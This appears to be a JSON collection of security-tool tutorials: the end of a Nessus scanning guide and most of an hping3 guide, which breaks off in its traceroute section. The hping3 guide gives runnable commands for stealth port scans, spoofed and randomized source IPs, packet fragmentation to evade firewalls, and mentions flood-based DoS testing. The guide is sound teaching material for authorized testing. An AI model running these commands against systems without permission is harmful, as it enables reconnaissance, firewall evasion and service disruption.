scan and click the **play icon (▶︎)** or the **\"Launch\"** button next to it.\n    *   Nessus will immediately begin probing the specified targets.\n\n### What to expect\n\n*   **Real-time Progress:** Once launched, you will be redirected to the scan overview page, where you can monitor the scan's progress in real-time, including the percentage complete and active hosts.\n*   **Detailed Results:** Upon completion, the scan status will change from \"Running\" to \"Completed.\" Click on the scan name to view the detailed results.\n*   **Vulnerability Categorization:** The results will present a list of discovered vulnerabilities, categorized by severity: **Critical, High, Medium, Low, and Info**. Each finding will include details such as the vulnerability name, description, affected hosts, and often remediation steps.\n\n### Troubleshooting & tips\n\n*   **Target Not Found/No Results:**\n    *   **Network Reachability:** Ensure the Nessus scanner can communicate with the target(s). Check network connectivity (ping), firewalls on the scanner and targets, and routing.\n    *   **Correct IP/Hostname:** Verify that the target IP addresses or hostnames are correct and active on the network.\n    *   **Nessus Service:** Confirm that the `nessusd` service is running correctly.\n*   **Incomplete or Limited Results (Non-Credentialed Scans):**\n    *   **Scan with Credentials:** For the most accurate and comprehensive results, perform an authenticated (credentialed) scan. This allows Nessus to log in to the target system (using SSH for Linux/macOS or SMB for Windows) and perform a much deeper, local analysis, significantly reducing false positives and identifying more vulnerabilities. You can configure credentials under the \"Credentials\" tab when setting up a scan.\n*   **Understanding the Report:** Don't just focus on \"Critical\" vulnerabilities. Read the description and proposed solution for *each* finding (Critical, High, Medium, Low, and Info) to understand the underlying risk and how to address it. \"Info\" items can often reveal valuable configuration details.\n*   **Overlapping Scans:** Avoid running multiple resource-intensive scans simultaneously on the same targets, especially on the same Nessus instance, as this can lead to performance degradation or incomplete results.\n*   **Scan Time:** Scans can take a significant amount of time, depending on the number of targets, the target's operating system, and the template chosen. Be patient.\n*   **Stay Updated:** Regularly update your Nessus scanner and its plugins. Tenable frequently releases new plugins to detect the latest threats and vulnerabilities, ensuring your scans remain effective. This usually happens automatically but can be manually triggered in the \"Settings\" > \"Plugin Updates\" section.\n*   **Schedule Regular Scans:** Vulnerabilities are discovered daily. Automate and schedule scans to continuously monitor your network's security posture and promptly identify new risks. This option is available under the \"Schedule\" tab when creating or editing a scan.\n\n### Safety / ethics note\n\n*   **Obtain Explicit Permission:** **It is paramount that you have explicit, written permission from the owner of any system or network before you initiate a vulnerability scan.** Scanning without permission is illegal, unethical, and can lead to severe legal consequences.\n*   **Responsible Disclosure:** If you discover vulnerabilities on systems you are authorized to scan, follow responsible disclosure practices. Report the findings to the system owner or appropriate authorities and allow them time to remediate before publicizing any details.\n*   **Potential for Disruption:** While Nessus is designed to be non-intrusive, there is always a minimal risk that some very old, fragile, or misconfigured systems might react negatively to network probing, potentially causing instability or service disruption. Exercise caution when scanning production environments. Start with less intrusive scans or test environments."
      }
    ]
  },
  {
    "name": "hping3",
    "description": "A command-line oriented TCP/IP packet assembler/analyzer.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "packet crafting",
      "firewall testing"
    ],
    "color": "#e59b4b",
    "articles": [
      {
        "title": "Mastering hping3: A Comprehensive Guide to Packet Crafting and Network Analysis",
        "content": "# Mastering hping3: A Comprehensive Guide to Packet Crafting and Network Analysis\n\n## About this document\nThis document serves as a comprehensive instructional guide for `hping3`, a powerful command-line oriented TCP/IP packet assembler and analyzer. It is designed to provide developers, network engineers, and security professionals with the knowledge and practical commands needed to effectively utilize `hping3` for various network testing, analysis, and security tasks.\n\n*   **Audience:** Network administrators, security analysts, penetration testers, system engineers, and developers who need to understand and interact with network protocols at a low level. A basic understanding of TCP/IP networking concepts is beneficial.\n*   **Scope:** This guide covers the installation, basic to advanced usage, common testing scenarios (ICMP, TCP, UDP), port scanning, firewall evasion, tracerouting, DoS/load testing, advanced features like file transfer and custom payloads, and practical examples. It also includes troubleshooting tips and important safety/ethical considerations.\n*   **Safety / Disclaimer:** The techniques described in this document involve generating and manipulating network packets, which can impact network performance and security. Unauthorized use of these tools for scanning, denial-of-service (DoS) testing, or any malicious activity against networks or systems you do not own or have explicit written permission to test is illegal and unethical. Always ensure you have proper authorization before conducting any network tests.\n\n## How this file is organized\nThis document is structured to provide clear, actionable information for each `hping3` topic. Each major topic follows a consistent five-part format:\n\n1.  **What it is / Why it matters:** A concise explanation of the topic, its purpose, and its significance in network analysis or security.\n2.  **Step-by-step commands:** Practical, runnable commands with clear syntax and sensible defaults, presented in markdown code blocks.\n3.  **What to expect:** A description of the typical output, expected behavior, or results after executing the commands, helping you interpret `hping3`'s responses.\n4.  **Troubleshooting & tips:** Common issues, potential errors, and how to resolve them, along with useful advice for optimizing usage or avoiding pitfalls.\n5.  **Safety / ethics note:** Specific considerations regarding the ethical and legal implications of the topic, emphasizing responsible use and the necessity of authorization.\n\n---\n\n## 1. Introduction to hping3\n\n### What it is / Why it matters\n`hping3` is a versatile command-line oriented TCP/IP packet assembler and analyzer. Inspired by the traditional Unix `ping` command, `hping3` extends its capabilities significantly beyond simple ICMP echo requests. It supports a wide array of protocols including TCP, UDP, ICMP, and RAW-IP, allowing users to craft and send custom packets. This makes `hping3` an invaluable tool for network testing, firewall bypass assessment, advanced port scanning, network discovery, and even rudimentary Denial of Service (DoS) testing. Its ability to finely control packet headers and payloads is critical for understanding network behavior and security posture.\n\n### Step-by-step commands\nAs an introductory section, there are no specific commands for \"What it is\" itself, but rather an overview. Installation commands are covered in the next section.\n\n### What to expect\nYou should now have a foundational understanding of what `hping3` is capable of and why it's a powerful tool for network professionals. Its primary function is to allow granular control over network packet generation and analysis, offering insights beyond typical network utilities.\n\n### Troubleshooting & tips\n*   **Conceptual Understanding:** If the capabilities seem abstract, consider reviewing basic TCP/IP networking principles to fully appreciate the power of packet crafting.\n*   **Start Simple:** Begin with basic `ping` and `TCP SYN` requests to grasp the tool's output before diving into advanced options.\n\n### Safety / ethics note\nUnderstanding `hping3`'s capabilities inherently comes with the responsibility of ethical usage. This tool can be misused for malicious activities. Always remember that any form of network testing, especially those involving crafted packets or potentially disruptive actions, should only be performed on networks and systems for which you have explicit, written permission from the owner.\n\n## 2. Installation & Setup\n\n### What it is / Why it matters\nProper installation of `hping3` is the first crucial step to leveraging its powerful network analysis capabilities. `hping3` is available on various operating systems, primarily Linux and macOS, and via WSL for Windows users. Ensuring it's correctly installed allows you to access its full suite of features for packet crafting, scanning, and testing.\n\n### Step-by-step commands\n\n#### Linux Installation\nMost Linux distributions offer `hping3` through their package managers.\n\n```bash\n# For Ubuntu/Debian based systems\nsudo apt update          # Update package lists\nsudo apt install hping3  # Install hping3\n\n# For CentOS/RHEL based systems\nsudo yum install hping3  # Install hping3\n\n# For Arch Linux based systems\nsudo pacman -S hping     # Install hping (note: package name is usually 'hping' on Arch)\n```\n\n#### macOS Installation\nOn macOS, Homebrew is the recommended package manager. You can also build from source.\n\n```bash\n# Using Homebrew (recommended)\nbrew install hping       # Install hping (package name for Homebrew is typically 'hping')\n\n# Installing from source (advanced users, for latest features or specific versions)\ngit clone https://github.com/antirez/hping\ncd hping\nmake\nsudo make install\n```\n\n#### Windows Installation\nThe most straightforward way to run `hping3` on Windows is by using the Windows Subsystem for Linux (WSL). Alternatively, you might use similar tools like `Nping` (part of Nmap) as `hping3` does not have a native Windows port.\n\n```bash\n# Using Windows Subsystem for Linux (WSL)\n# First, ensure WSL is installed and set up with a Linux distribution (e.g., Ubuntu).\n# Then, open your WSL terminal and run the Linux installation command:\nwsl sudo apt install hping3\n```\n\n### What to expect\n*   **Linux/macOS (Package Manager):** The package manager will download and install `hping3` and its dependencies. You should see messages indicating successful installation, and `hping3` should be available in your PATH.\n    *   To verify, run: `hping3 --version` or `which hping3`.\n*   **macOS (From Source):** After `make install`, the `hping3` executable will be placed in a system PATH directory (e.g., `/usr/local/bin`).\n*   **Windows (WSL):** `hping3` will be installed within your WSL environment and will be runnable from the WSL terminal.\n\n### Troubleshooting & tips\n*   **Permission Issues:** If you encounter `Permission denied` errors during installation from source, ensure you are using `sudo` for `make install`.\n*   **Missing Dependencies:** `hping3` might require development headers (e.g., `libpcap-dev`, `libnet-dev`). If `make` fails from source, check the error output for missing libraries and install them via your package manager (e.g., `sudo apt install libpcap-dev libnet-dev`).\n*   **PATH Variable:** If `hping3` is not found after installation, ensure `/usr/local/bin` (or equivalent) is in your system's PATH variable, especially if installing from source.\n*   **WSL Setup:** For Windows users, make sure WSL is correctly configured and your chosen Linux distribution is fully updated before attempting to install `hping3` within it.\n*   **Alternative Tools:** If `hping3` proves difficult to install on your specific environment, consider `Nping` (part of the Nmap suite) as a robust alternative for similar packet crafting capabilities.\n\n### Safety / ethics note\nThe installation process itself is generally safe. However, ensure you download `hping3` from official repositories or the trusted GitHub source to prevent installing malicious or compromised versions. Always keep your system and installed packages updated to mitigate security vulnerabilities.\n\n## 3. Basic Usage & Syntax\n\n### What it is / Why it matters\nUnderstanding the fundamental syntax and common options of `hping3` is essential for any task, from simple host reachability checks to complex protocol testing. `hping3`'s command structure allows for significant customization, enabling users to specify target hosts, protocols, ports, and various packet flags and options. Mastering these basics is the foundation for all advanced `hping3` operations.\n\n### Step-by-step commands\n\n#### Command Structure\nThe basic syntax involves `sudo hping3 [options] hostname`. `sudo` is often required because `hping3` operates at the raw socket level, which typically needs root privileges.\n\n```bash\n# Basic syntax\nsudo hping3 [options] hostname_or_IP_address\n\n# Example: ICMP ping (default behavior if no protocol is specified)\nsudo hping3 example.com\n\n# Example: TCP SYN ping to a specific port\nsudo hping3 -S example.com -p 80\n\n# Example: UDP ping to a specific port\nsudo hping3 --udp example.com -p 53\n```\n\n#### Common Options\n`hping3` provides a rich set of options to control packet generation.\n\n```bash\n# Protocol selection\n-0, --rawip     # RAW IP mode: Send IP packets without any protocol header\n-1, --icmp      # ICMP mode (default): Send ICMP packets (e.g., echo requests)\n-2, --udp       # UDP mode: Send UDP packets\n-8, --scan      # Scan mode: Used for port scanning (covered in a dedicated section)\n-9, --listen    # Listen mode: Listen for incoming packets (e.g., for file transfer)\n\n# TCP flags (used with TCP mode -S, -A, etc.)\n-S, --syn       # Set SYN flag (initiates a connection)\n-A, --ack       # Set ACK flag (acknowledges received data)\n-R, --rst       # Set RST flag (resets a connection)\n-F, --fin       # Set FIN flag (terminates a connection)\n-P, --push      # Set PUSH flag (requests immediate delivery of data)\n-U, --urg       # Set URG flag (indicates urgent data)\n\n# Port and timing options\n-p, --destport  # Destination port (e.g., -p 80)\n-s, --baseport  # Source port (random by default, -s 12345 to set)\n-i, --interval  # Packet interval (e.g., -i 1 for 1 second, -i u100000 for 100ms)\n-c, --count     # Number of packets to send (e.g., -c 10)\n-d, --data      # Data size (bytes) of the custom payload (e.g., -d 100)\n-W, --wait      # Wait time for replies (timeout in seconds, e.g., -W 3)\n```\n\n### What to expect\n*   **ICMP Ping:** Similar output to the standard `ping` command, showing `len`, `ip`, `ttl`, `rtt`, and sequence numbers.\n*   **TCP Ping:** For an open port, you'll typically see replies with `flags=SA` (SYN-ACK) indicating the target accepted the SYN packet. For a closed port, you might see `flags=RA` (RST-ACK) indicating the target rejected the connection attempt.\n*   **UDP Ping:** May receive ICMP Port Unreachable messages if the port is closed, or no response if the port is open but the service doesn't reply.\n*   **No response:** This could mean the target is down, a firewall is blocking packets, or the port is open but the service is silent.\n\n### Troubleshooting & tips\n*   **`sudo` Requirement:** If you get `Operation not permitted` or similar errors, ensure you are running `hping3` with `sudo`.\n*   **Hostname Resolution:** If `hping3` reports \"Unknown host\", verify the hostname is correct and resolvable via DNS. You can use an IP address directly to bypass DNS issues.\n*   **Firewall Blocking:** If you're not getting any replies, a firewall (either on your machine, the target, or an intermediate network device) might be blocking the traffic.\n*   **Increase Timeout:** For slow or distant targets, increase the wait time for replies using `-W` (e.g., `-W 5` for a 5-second timeout).\n*   **Packet Count:** For initial tests, use `-c 1` or `-c 3` to send a limited number of packets and observe the behavior before sending many.\n*   **Verbosity:** `hping3` doesn't have a `--verbose` flag like some tools, but its default output is generally informative.\n\n### Safety / ethics note\nEven basic usage can reveal information about a target network. When performing even simple pings, you are sending traffic to a remote host. Always ensure you have authorization to probe the target, especially if it's not your own network. Be mindful of the volume of traffic you generate; even basic pings, if sent in large quantities, can be disruptive.\n\n## 4. ICMP Testing\n\n### What it is / Why it matters\nICMP (Internet Control Message Protocol) is a fundamental protocol used for error reporting and diagnostic functions in IP networks. `hping3` allows for advanced ICMP testing beyond a standard `ping`, enabling users to send various ICMP message types and craft custom ICMP packets. This is crucial for network discovery, troubleshooting connectivity issues, analyzing firewall rules, and understanding how a target responds to different ICMP requests.\n\n### Step-by-step commands\n\n#### Basic ICMP Ping\nThe `-1` or `--icmp` option explicitly sets `hping3` to ICMP mode.\n\n```bash\n# Standard ICMP echo request (default for -1)\nsudo hping3 -1 example.com\n\n# ICMP echo request with custom interval (100ms between packets)\nsudo hping3 -1 -i u100000 example.com  # 'u' specifies microseconds, so 100000us = 100ms\n\n# ICMP echo request with a limited packet count (send 10 packets)\nsudo hping3 -1 -c 10 example.com\n\n# ICMP echo request with custom packet size (1000 bytes of data in the payload)\nsudo hping3 -1 -d 1000 example.com\n```\n\n#### ICMP Types\n`hping3` supports sending different ICMP types using `--icmptype` and `--icmpcode`.\n\n```bash\n# ICMP Echo Request (Type 8, Code 0 - default for -1)\nsudo hping3 -1 example.com\n\n# ICMP Timestamp Request (Type 13, Code 0)\nsudo hping3 -1 --icmptype 13 example.com\n\n# ICMP Address Mask Request (Type 17, Code 0)\nsudo hping3 -1 --icmptype 17 example.com\n\n# Custom ICMP type and code (e.g., Echo Request, Code 0 explicitly)\nsudo hping3 -1 --icmptype 8 --icmpcode 0 example.com\n```\n\n### What to expect\n*   **Echo Replies:** For successful ICMP Echo Requests (Type 8), you will receive `len=... ip=... ttl=... id=... rtt=... ms` messages, similar to standard `ping`.\n*   **Timestamp Replies:** For Timestamp Requests (Type 13), the response will include the origin, receive, and transmit timestamps.\n*   **Address Mask Replies:** For Address Mask Requests (Type 17), if supported and not filtered, you might receive the target's network mask.\n*   **No Response / Unreachable:** If the target is down, the host blocks ICMP, or an intermediate firewall filters the traffic, you may see `hping3` report \"no response\" or receive `ICMP Unreachable` messages from a gateway.\n*   **Varying RTT/TTL:** Observe variations in Round Trip Time (RTT) and Time To Live (TTL) values, which can indicate network latency or routing changes.\n\n### Troubleshooting & tips\n*   **Firewall Blocks ICMP:** Many firewalls are configured to drop certain ICMP types (e.g., Echo Requests) or all ICMP traffic. If you're not getting replies, the target or an intermediate device might be filtering ICMP.\n*   **Check ICMP Type Support:** Not all systems or network devices respond to all ICMP types (e.g., Timestamp, Address Mask). A lack of response doesn't necessarily mean the target is down, but rather that it doesn't support or is configured not to reply to that specific ICMP type.\n*   **Increase Packet Size:** Using `-d` with a larger value can help identify MTU (Maximum Transmission Unit) issues if packets start getting fragmented or dropped.\n*   **Interval & Count:** Adjust `-i` and `-c` to control the rate and number of packets. A slower rate might be necessary for unstable networks or to avoid triggering IDS/IPS.\n*   **Analyze TTL:** The TTL value in responses can indicate the number of hops to the target.\n\n### Safety / ethics note\nICMP testing, while seemingly benign, can be used for network reconnaissance. Sending unusual ICMP types might reveal information about the target's operating system or network configuration. Excessive ICMP floods (`--flood` option, covered later) can lead to a Denial of Service. Always ensure you have explicit permission to perform ICMP testing on target systems and be aware of the potential for detection by network monitoring systems.\n\n## 5. TCP Testing\n\n### What it is / Why it matters\nTCP (Transmission Control Protocol) is the backbone of reliable communication on the internet. `hping3`'s ability to craft and send custom TCP packets, including setting specific TCP flags, is incredibly powerful for assessing network security. It allows for detailed port scanning, firewall rule testing, understanding TCP/IP stack behavior, and even initiating specific connection states without a full TCP handshake. This is crucial for identifying open ports, determining service availability, and probing network defenses.\n\n### Step-by-step commands\n\n#### TCP SYN Ping\nThe `-S` or `--syn` option is used to send TCP SYN packets, simulating the first step of a TCP handshake. This is a common method for port scanning.\n\n```bash\n# TCP SYN to port 80 (HTTP)\nsudo hping3 -S example.com -p 80\n\n# TCP SYN to multiple ports (e.g., 80, 81, 82, ...)\n# The '++' prefix increments the port number for each packet sent.\nsudo hping3 -S example.com -p ++80\n\n# TCP SYN with a custom source port (useful for evasion or specific tests)\nsudo hping3 -S example.com -p 80 -s 12345\n```\n\n#### TCP Flag Combinations\n`hping3` can set almost any combination of TCP flags, which is useful for advanced port scanning (like FIN, NULL, XMAS scans) and firewall analysis.\n\n```bash\n# SYN+ACK (useful for simulating a response or specific attacks)\nsudo hping3 -SA example.com -p 80\n\n# FIN scan (only FIN flag set; often used as a stealthy scan)\nsudo hping3 -F example.com -p 80\n\n# NULL scan (no TCP flags set; another stealthy scan technique)\nsudo hping3 example.com -p 80\n\n# XMAS scan (FIN+PSH+URG flags set; another stealthy scan technique)\nsudo hping3 -FPU example.com -p 80\n```\n\n#### TCP Options\nCustomize various TCP header fields to test specific scenarios or identify unusual network behaviors.\n\n```bash\n# Custom TCP window size (e.g., to test window scaling or buffer sizes)\nsudo hping3 -S example.com -p 80 -w 65535\n\n# Custom sequence number (to control TCP sequence prediction tests)\nsudo hping3 -S example.com -p 80 -M 12345\n\n# Custom acknowledgment number (for specific TCP state manipulation)\nsudo hping3 -S example.com -p 80 -L 67890\n```\n\n### What to expect\n*   **Open Port (SYN scan):** A target with an open port typically replies with `flags=SA` (SYN-ACK), indicating it's ready to establish a connection.\n*   **Closed Port (SYN scan):** A target with a closed port usually replies with `flags=RA` (RST-ACK), indicating an active rejection of the connection attempt.\n*   **Filtered Port (SYN scan):** No response, or an `ICMP Destination Unreachable` message, often signifies a firewall is blocking the traffic.\n*   **FIN/NULL/XMAS Scans (Open Port):** According to RFC 793, an open port should *not* respond to these packets, making no response an indicator of an open port.\n*   **FIN/NULL/XMAS Scans (Closed Port):** A closed port should respond with `flags=RA` (RST-ACK).\n*   **TTL, RTT, Window Size:** Observe these values in responses for insights into network latency, hop count, and server configuration.\n\n### Troubleshooting & tips\n*   **Understanding TCP State:** Familiarize yourself with the TCP three-way handshake and how different flags influence connection states to correctly interpret responses.\n*   **Firewall Interference:** Firewalls are a primary reason for unexpected `hping3` TCP output. They can block SYN packets, drop specific flag combinations, or send RST/ACKs themselves.\n*   **Timing:** For accurate results, especially with scanning multiple ports, consider adjusting the interval (`-i`) and timeout (`-W`) to avoid overwhelming the target or missing slow responses.\n*   **Combine with Nmap:** While `hping3` is excellent for raw packet crafting, Nmap offers more robust port scanning and service version detection features. Use `hping3` for more granular tests once you've identified potential targets with Nmap.\n*   **Randomize Source Port/IP:** For stealth or to test certain firewall rules, use `--rand-source-port` (or `-s` with a chosen port) and `--rand-source` (randomize source IP).\n\n### Safety / ethics note\nTCP testing, particularly port scanning and flag manipulation, can be detected by Intrusion Detection/Prevention Systems (IDS/IPS). Aggressive scanning can also be interpreted as a hostile act and trigger alerts. Be extremely cautious with options like `--flood`. Never perform these tests on networks or systems without explicit, written authorization. Incorrectly crafted packets or flood attacks can destabilize network services or crash target systems.\n\n## 6. UDP Testing\n\n### What it is / Why it matters\nUDP (User Datagram Protocol) is a connectionless protocol often used for services where speed and efficiency are prioritized over reliability, such as DNS, SNMP, and NTP. `hping3` allows users to send custom UDP packets, which is essential for testing the availability and responsiveness of UDP-based services, assessing UDP firewall rules, and performing UDP-specific reconnaissance. Understanding UDP responses (or lack thereof) helps in diagnosing service issues and identifying open UDP ports.\n\n### Step-by-step commands\n\n#### UDP Ping\nThe `--udp` or `-2` option sets `hping3` to UDP mode. You must specify a destination port using `-p`.\n\n```bash\n# UDP ping to DNS port (53)\nsudo hping3 --udp example.com -p 53\n\n# UDP ping with custom payload size (e.g., for testing SNMP, port 161, with 100 bytes of data)\nsudo hping3 --udp example.com -p 161 -d 100\n\n# UDP scan multiple ports (e.g., 53, 54, 55, ...)\nsudo hping3 --udp example.com -p ++53\n```\n\n#### UDP Service Testing\nSpecific examples for common UDP services.\n\n```bash\n# Test a public DNS server\nsudo hping3 --udp 8.8.8.8 -p 53 -c 3\n\n# Test SNMP (Simple Network Management Protocol) on a target (replace 'target' with IP/hostname)\nsudo hping3 --udp target -p 161 -c 3 -d 100 # -d 100 provides some data for a basic SNMP probe\n\n# Test NTP (Network Time Protocol) on a public pool server\nsudo hping3 --udp pool.ntp.org -p 123 -c 3\n```\n\n### What to expect\n*   **Open UDP Port:** The most common behavior for an open UDP port is *no response*. This is because UDP is connectionless and many services do not send an explicit acknowledgment. You might infer a port is open if there's no ICMP Port Unreachable message.\n*   **Closed UDP Port:** If a UDP port is closed, the target system will typically respond with an `ICMP Destination Port Unreachable` message. This is a key indicator for closed UDP ports.\n*   **Filtered UDP Port:** A firewall blocking UDP traffic will usually result in no response, similar to an open port. Differentiating between an open and filtered port can be challenging with UDP without further analysis (e.g., by observing whether other protocols are also filtered).\n*   **Service-Specific Responses:** Some UDP services might reply with application-layer data if properly queried, but `hping3` raw UDP mode won't typically interpret this. You'd see raw data if collected with a sniffer.\n\n### Troubleshooting & tips\n*   **No Response vs. Open Port:** The \"no response\" characteristic of UDP for open ports can be misleading. Always look for ICMP Port Unreachable messages to confirm a *closed* port. If no such message is received, the port is likely open or filtered.\n*   **Firewall Evasion:** UDP traffic is often treated differently by firewalls than TCP. Test different ports and payload sizes (`-d`) to understand firewall behavior.\n*   **Payload Data:** For certain UDP services (like DNS or SNMP), sending specific application-layer data is necessary to elicit a meaningful response. `hping3` allows for simple data payloads (`-d` for size, `--data` for specific string, `-E` for file). However, for complex application-layer queries, dedicated tools (e.g., `dig` for DNS, `snmpwalk` for SNMP) are more suitable.\n*   **Timeouts:** Ensure you set an adequate timeout (`-W`) as UDP responses might be slower or simply absent.\n\n### Safety / ethics note\nUDP testing shares similar risks with other forms of network probing. Sending a large volume of UDP packets (especially with `--flood`) can easily overwhelm target systems or intermediate network devices, leading to Denial of Service conditions. Many critical services (DNS, NTP) rely on UDP, and their disruption can have significant consequences. Always obtain explicit authorization and be mindful of the potential impact on service availability.\n\n## 7. Port Scanning\n\n### What it is / Why it matters\nPort scanning is a technique used to discover open ports and services on a remote host. `hping3`, with its granular control over packet headers and flags, is an excellent tool for crafting various types of port scans, including stealthy methods that might bypass simpler firewalls or detection systems. This capability is vital for penetration testing, vulnerability assessment, and understanding the attack surface of a system.\n\n### Step-by-step commands\n\n#### TCP Port Scanning\n`hping3`'s `-8` or `--scan` option can automate scanning ranges of TCP ports using various TCP flags. It's often combined with `-S` for SYN scans.\n\n```bash\n# Scan a single port (same as -S target -p 80 -c 1)\nsudo hping3 -S example.com -p 80 -c 1\n\n# Scan a range of ports (e.g., 1-1024)\n# The --scan option takes a range of ports or a comma-separated list.\nsudo hping3 -S example.com --scan 1-1024\n\n# Fast port scan (scan ports 1 to 1024 with 100 microsecond interval)\n# Note: Using --scan with -i for interval applies the interval to each port scan attempt.\nsudo hping3 -S example.com --scan 1-1024 -i u100\n\n# Stealth scan with random source ports (harder to trace, might bypass simple firewalls)\nsudo hping3 -S example.com --scan 1-1024 --rand-source-port\n```\n\n#### Scan Modes\nDifferent TCP flags can be used for various scanning techniques, some of which are designed to be stealthier or test specific firewall rules.\n\n```bash\n# SYN scan (most common, detects open/closed ports)\nsudo hping3 -S target.com --scan 1-1000\n\n# FIN scan (stealthy; open ports give no response, closed ports give RST/ACK)\nsudo hping3 -F target.com --scan 1-1000\n\n# ACK scan (used for firewall testing; helps determine if a port is filtered or unfiltered)\nsudo hping3 -A target.com --scan 1-1000\n\n# NULL scan (stealthy; no flags set; open ports give no response, closed ports give RST/ACK)\nsudo hping3 target.com --scan 1-1000\n```\n\n### What to expect\n*   **SYN Scan:**\n    *   **Open Port:** `flags=SA` (SYN-ACK) in response.\n    *   **Closed Port:** `flags=RA` (RST-ACK) in response.\n    *   **Filtered Port:** No response or `ICMP Destination Unreachable`.\n*   **FIN/NULL/XMAS Scans:**\n    *   **Open Port:** No response.\n    *   **Closed Port:** `flags=RA` (RST-ACK) in response.\n    *   **Filtered Port:** No response or `ICMP Destination Unreachable`.\n*   **ACK Scan:**\n    *   **Unfiltered Port:** `flags=R` (RST) in response (indicates port is accessible, but doesn't tell if it's open/closed).\n    *   **Filtered Port:** No response or `ICMP Destination Unreachable`.\n*   **Performance:** Faster scans (`-i u100`) will produce output quickly, but might miss responses on congested networks or be detected by IDS/IPS.\n\n### Troubleshooting & tips\n*   **Speed vs. Stealth:** Fast scans (`-i uX`) are often louder and more easily detected. Slower scans are stealthier but take longer. Balance these based on your objective.\n*   **Firewall Detection:** Be aware that various scan types (especially SYN scans) are commonly detected by network security devices. Stealthier scans (FIN, NULL, XMAS) attempt to evade this but are not foolproof.\n*   **False Positives/Negatives:** No response can mean \"open\" (for stealth scans), \"filtered,\" or \"host down.\" Context and correlation with other scan types are crucial.\n*   **Combine with `nmap`:** For robust port scanning with service version detection and OS fingerprinting, `nmap` is generally preferred. `hping3` is better for highly customized, low-level testing or when `nmap` is blocked.\n*   **Randomize:** Using `--rand-source` or `--rand-source-port` can help in evading simple stateful firewalls that track connections based on source IP/port.\n\n### Safety / ethics note\nPort scanning, even for legitimate purposes, is a sensitive activity. It generates traffic that can be logged and flagged by security systems. Unauthorized port scanning can be considered a hostile reconnaissance activity and may lead to legal repercussions. Always obtain clear, explicit authorization for any port scanning activities on external networks. Be particularly cautious when using rapid scan rates or `--flood` which can inadvertently cause a denial of service.\n\n## 8. Firewall Testing\n\n### What it is / Why it matters\nFirewalls are critical components of network security, controlling ingress and egress traffic based on predefined rules. `hping3`'s ability to craft packets with specific flags, payloads, and source/destination information makes it an invaluable tool for testing and analyzing firewall rules. By sending various types of packets, you can determine which ports are open, closed, or filtered, and identify potential misconfigurations or vulnerabilities in a firewall's policy.\n\n### Step-by-step commands\n\n#### Firewall Rule Testing\nTest how a firewall responds to different TCP flags or packet characteristics.\n\n```bash\n# Test if a TCP port (e.g., 80) is filtered by a firewall (SYN scan)\n# Expect SYN-ACK if open, RST-ACK if closed, no response/ICMP Unreachable if filtered.\nsudo hping3 -S target.com -p 80 -c 3\n\n# Test with ACK flag: An unfiltered port should respond with RST. A filtered port will give no response.\nsudo hping3 -A target.com -p 80 -c 3\n\n# Test with FIN flag: An unfiltered, open port should give no response. A closed port should give RST-ACK.\nsudo hping3 -F target.com -p 80 -c 3\n\n# Test with fragmented packets: Some older firewalls might allow fragmented packets to bypass rules.\nsudo hping3 -S target.com -p 80 -f -c 3 # -f for fragment option\n```\n\n#### Evasion Techniques\n`hping3` offers options to simulate common evasion techniques, allowing you to test a firewall's robustness against such attempts.\n\n```bash\n# Random source IP: Test if the firewall tracks connections based on source IP.\nsudo hping3 -S target.com -p 80 --rand-source -c 3\n\n# Spoof specific source IP: Impersonate an internal or trusted IP address.\nsudo hping3 -S target.com -p 80 -a 192.168.1.100 -c 3 # -a for spoofed source IP\n\n# Fragment packets: Break packets into smaller fragments; some firewalls don't reassemble/inspect properly.\nsudo hping3 -S target.com -p 80 -f -c 3\n\n# Custom TTL (Time-To-Live): Adjust TTL to mimic a different operating system or bypass certain hop-count based rules.\nsudo hping3 -S target.com -p 80 -t 128 -c 3 # 128 is common for Windows, 64 for Linux/Unix\n```\n\n### What to expect\n*   **Open Port (Unfiltered):** `flags=SA` (SYN-ACK) for SYN, no response for FIN/NULL/XMAS.\n*   **Closed Port (Unfiltered):** `flags=RA` (RST-ACK) for SYN, FIN, NULL, XMAS. `flags=R` for ACK.\n*   **Filtered Port:** No response, or an `ICMP Destination Unreachable` (e.g., \"communication administratively filtered\") message. This is the key indicator that a firewall or router is actively blocking the traffic.\n*   **Evasion Success:** If an evasion technique works, you might see responses that previously were blocked (e.g., a SYN-ACK for a port that was previously \"filtered\").\n\n### Troubleshooting & tips\n*   **Baseline First:** Always perform a baseline scan without any evasion techniques to understand the firewall's default behavior. Then introduce one evasion technique at a time.\n*   **Packet Capture:** Use `tcpdump` or Wireshark alongside `hping3` to capture and analyze the packets on both the attacking machine and, if possible, on the target network. This gives granular insight into how packets are being processed and dropped.\n*   **Understand Firewall Types:** Different firewall types (stateless vs. stateful, network vs. application layer) will respond differently to various `hping3` tests.\n*   **Check Local Firewalls:** Ensure your own local firewall (e.g., `ufw`, `firewalld` on Linux, Windows Defender Firewall) isn't blocking your outbound `hping3` traffic or inbound responses.\n*   **Legitimate Traffic:** Test your hypotheses with legitimate traffic if possible (e.g., try connecting with a browser to a detected open web port).\n\n### Safety / ethics note\nFirewall testing, especially with evasion techniques or spoofed IPs, is a high-impact activity. It can trigger alarms in security systems (IDS/IPS), lead to network policy violations, and, if not done carefully, cause service disruption. Spoofing IP addresses without authorization is highly illegal in many jurisdictions. **Always obtain explicit, written authorization from the network owner before engaging in any firewall testing, especially with evasion techniques.**\n\n## 9. Traceroute Functionality\n\n### What it is / Why it matters\nTraceroute is a network diagnostic tool used to display the path (route) and measure transit delays of packets across an IP network. `hping3` provides a flexible traceroute mode that can use various protocols (TCP, ICMP, UDP) and flags, unlike the traditional `traceroute` utility which typically relies on UDP or ICMP. This allows for more granular control, firewall analysis, and the ability to trace paths for specific service ports, providing deeper insights into network topology and latency.\n\n### Step-by-step commands\n\n#### TCP Traceroute\nUse the `-T` or `--traceroute` option with TCP flags and a destination port.\n\n```bash\n# TCP traceroute to port 80 (HTTP)\nsudo hping3 -S example.com -p 80 -T\n\n# TCP traceroute with TTL increment kept between packets (more robust for some network configurations)\n# This prevents resetting the TTL for each new packet in the same hop sequence.\nsudo hping3 -S example.com -p 80 -T --tr-keep-ttl\n\n# Traceroute with a custom starting TTL (e.g., to start tracing from hop 1)\nsudo hping3 -S example.com -p 80 -t 1 -T\n```\n\n#### ICMP Traceroute\nCombine the `-T` option with ICMP mode (`-1`).\n\n```bash\n# ICMP traceroute (similar to standard 'traceroute' or 'tracert')\nsudo hping3 -1 example.com -T\n\n# Traceroute with multiple packets per hop (useful for identifying packet loss or variable latency)\nsudo hping3 -1 example.com -T -c 3 # Sends 3 packets per TTL increment\n```\n\n### What to 